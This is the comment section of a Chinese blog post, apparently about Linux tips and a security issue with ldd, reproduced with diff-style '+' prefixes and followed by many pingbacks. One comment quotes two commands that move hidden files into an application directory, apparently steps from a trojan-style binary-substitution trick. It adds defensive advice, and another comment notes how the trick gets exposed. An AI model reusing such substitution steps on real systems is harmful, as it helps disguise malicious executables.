+<p>牛人啊，不错的文章，翻译也很棒！</p>
+</div>
+ </article>
+</li>
+<li id="comment-253285" class="comment odd alt thread-even depth-1">
+<article id="div-comment-253285" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/a6e9e679d4d308a570b1e74705c026de?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/a6e9e679d4d308a570b1e74705c026de?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn"><a href="http://www.oldlinux.org/oldlinux/index.php" class="url" rel="ugc external nofollow">full_of_bullshit</a></b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-253285"><time datetime="2013-01-01T10:16:47+08:00">2013年01月01日 10:16</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>BTW，个人还不是很清楚上面这两句命令的作用，哪位高手解析一下？<br/>
+`mv ~/.hidden/working_app ~/app/bin/myapp`<br/>
+`mv ~/.hidden/libat.so.o ~/app/bin/`<br/>
+另外加几句个人认为的经验：<br/>
+1.不要用root身份去执行任何不明的可执行文件。<br/>
+2.用Linux自带的工具查看分析可执行文件的链接（如READELF，OBJDUMP等），当然执行工具也要非root身份。<br/>
+3.尽量了解shell命令的源代码。</p>
+</div>
+ </article>
+</li>
+<li id="comment-260938" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="/articles/8883.html" class="url" rel="ugc">你应该知道的Linux技巧 | 酷壳 - CoolShell.cn</a> </div>
+</li>
+<li id="comment-261027" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.ubuntuhome.com/should-konw-linux-tips.html" class="url" rel="ugc external nofollow">应该知道的Linux技巧 | Ubuntu Home</a> </div>
+</li>
+<li id="comment-261588" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://read.guoruei.net/archives/903" class="url" rel="ugc external nofollow">read.guoruEi » Blog Archive » 应该知道的Linux技巧</a> </div>
+</li>
+<li id="comment-261676" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://gjkiss.info/2013/01/%e5%ba%94%e8%af%a5%e7%9f%a5%e9%81%93%e7%9a%84linux%e6%8a%80%e5%b7%a7" class="url" rel="ugc external nofollow">牧场勿语 » 应该知道的Linux技巧</a> </div>
+</li>
+<li id="comment-262277" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.suziebaby.com/?p=19" class="url" rel="ugc external nofollow">应该知道的Linux技巧 | Suziebaby</a> </div>
+</li>
+<li id="comment-262605" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://architecture.riaos.com/?p=3020097" class="url" rel="ugc external nofollow">应该知道的Linux技巧 | 架构（architecture.riaos.com）</a> </div>
+</li>
+<li id="comment-264002" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://web.itivy.com/your-must-know-linux-skill/" class="url" rel="ugc external nofollow">你不得不知道的Linux技巧 – WEB开发家园</a> </div>
+</li>
+<li id="comment-264567" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.zoio.info/basic/os/225.html" class="url" rel="ugc external nofollow">应该知道的Linux技巧 | 贱八哥技术网</a> </div>
+</li>
+<li id="comment-265754" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://blog.maxrocky.cn/201301/334.html" class="url" rel="ugc external nofollow">你应该知道的一些 Linux 技巧 zz | MAXROCKY 创新 BLOG</a> </div>
+</li>
+<li id="comment-290350" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://blog.yuanjing.net/tech/server/532.html" class="url" rel="ugc external nofollow">应该知道的Linux技巧 | 远景站长</a> </div>
+</li>
+<li id="comment-293029" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://isee.sinaapp.com/?p=94" class="url" rel="ugc external nofollow">I-see » 应该知道的Linux技巧</a> </div>
+</li>
+<li id="comment-294252" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.wangyuxiong.com/archives/51873" class="url" rel="ugc external nofollow">点滴–挖掘技术细节 » 应该知道的Linux技巧</a> </div>
+</li>
+<li id="comment-316353" class="comment even thread-odd thread-alt depth-1">
+<article id="div-comment-316353" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/c8fb444f54d1339c0cf4558627eaa246?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/c8fb444f54d1339c0cf4558627eaa246?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">EasternHeart</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-316353"><time datetime="2013-03-25T03:38:08+08:00">2013年03月25日 03:38</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>话说新的debian multi-arch libc在/lib/$TRIPLETS/libc.so.6…呵呵……马上漏馅</p>
+</div>
+ </article>
+</li>
+<li id="comment-322482" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.crazyshell.net/?p=162" class="url" rel="ugc external nofollow">应该知道的Linux技巧–陈皓 | 疯狂的贝壳-crazyshell.net</a> </div>
+</li>
+<li id="comment-327739" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://argcandargv.com/articles/968.c" class="url" rel="ugc external nofollow">应该知道的Linux技巧 | argc &amp;&amp; argv</a> </div>
+</li>
+<li id="comment-329510" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://yaha.me/%e5%ba%94%e8%af%a5%e7%9f%a5%e9%81%93%e7%9a%84linux%e6%8a%80%e5%b7%a7/" class="url" rel="ugc external nofollow">应该知道的Linux技巧</a> </div>
+</li>
+<li id="comment-373269" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.520lily.com/html/864.html" class="url" rel="ugc external nofollow">应该知道的Linux技巧 | 午后小憩</a> </div>
+</li>
+<li id="comment-548224" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.golang.name/linux_skill_tutorial/" class="url" rel="ugc external nofollow">基础Linux技巧 | 小书童</a> </div>
+</li>
+<li id="comment-719005" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.zhanghaohao.cn/archives/341" class="url" rel="ugc external nofollow">应该了解的Linux技巧 | 张浩浩博客</a> </div>
+</li>
+<li id="comment-1317248" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="https://zend-bbxyard.rhcloud.com/blog/2014/02/%e8%bd%ac%e5%ba%94%e8%af%a5%e7%9f%a5%e9%81%93%e7%9a%84linux%e6%8a%80%e5%b7%a7/" class="url" rel="ugc external nofollow">[转]应该知道的Linux技巧 | bbxyard</a> </div>
+</li>
+<li id="comment-1417461" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.21ops.com/linux/23634.html" class="url" rel="ugc external nofollow">linux技巧大搜集 - 新世纪Linux社区</a> </div>
+</li>
+<li id="comment-1419127" class="comment odd alt thread-even depth-1">
+<article id="div-comment-1419127" class="comment-body">
+<footer class="comment-meta">
+<div class="comment-author vcard">
+<img alt="" src="https://secure.gravatar.com/avatar/4e8f4bd7fc5f3fbaa9699945b413839b?s=50&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/4e8f4bd7fc5f3fbaa9699945b413839b?s=100&amp;d=mm&amp;r=g 2x" class="avatar avatar-50 photo" height="50" width="50" loading="lazy" decoding="async"/> <b class="fn">persmule</b><span class="says">说道：</span> </div>
+<div class="comment-metadata">
+<a href="/articles/1626.html#comment-1419127"><time datetime="2014-04-10T12:59:16+08:00">2014年04月10日 12:59</time></a> </div>
+</footer>
+<div class="comment-content">
+<p>如果我直接使用/path/to/ld-linux.so –list executable会有问题么？</p>
+</div>
+ </article>
+</li>
+<li id="comment-1480707" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://blog.aliyun.com/893" class="url" rel="ugc external nofollow">阿里云产品博客 » 应该知道的Linux技巧</a> </div>
+</li>
+<li id="comment-1634078" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://dovps.cn/lnmp/you-should-know-that-linux-skills/" class="url" rel="ugc external nofollow">那些你应该知道的Linux技巧 | 【都VPS–doVPS.cn】</a> </div>
+</li>
+<li id="comment-1816160" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.xuxiaobo.com/?p=983" class="url" rel="ugc external nofollow">应该知道的Linux技巧 酷壳 – CoolShell.cn | 酷 壳 – CoolShell.cn – <span class="__cf_email__" data-cfemail="8fc3e0e8cfd7a1d7a1cd">[email protected]</span></a> </div>
+</li>
+<li id="comment-1826694" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.178linux.com/2442" class="url" rel="ugc external nofollow">ldd 的一个安全问题 – linux运维部落</a> </div>
+</li>
+<li id="comment-1933140" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="http://www.nullbug.cn/index.php/2018/07/05/%e4%bd%a0%e5%ba%94%e8%af%a5%e7%9f%a5%e9%81%93%e4%bd%86%e4%b8%8d%e8%a6%81%e6%b1%82%e7%86%9f%e6%82%89%e7%9a%84linux%e4%bd%bf%e7%94%a8%e6%8a%80%e5%b7%a7/" class="url" rel="ugc external nofollow">你应该知道但不要求熟悉的linux使用技巧-Ktong</a> </div>
+</li>
+<li id="comment-1951663" class="pingback odd alt thread-even depth-1">
+<div class="comment-body">
+Pingback： <a href="https://blog.52xintaidu.com/?p=1139" class="url" rel="ugc external nofollow">应该知道的LINUX技巧 – 52新态度-JAVA技术</a> </div>
+</li>
+<li id="comment-2096731" class="pingback even thread-odd thread-alt depth-1">
+<div class="comment-body">
+Pingback： <a href="https://www.52xintaidu.com/it/linux/1139.html" class="url" rel="ugc external nofollow">应该知道的LINUX技巧 - 52新态度-52新态度</a> </div>
+</li>
+</ol>
+
+</div>
+</div>
+</div>
+
+</div> 
+</div>
+
+</div>
+
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body></html>
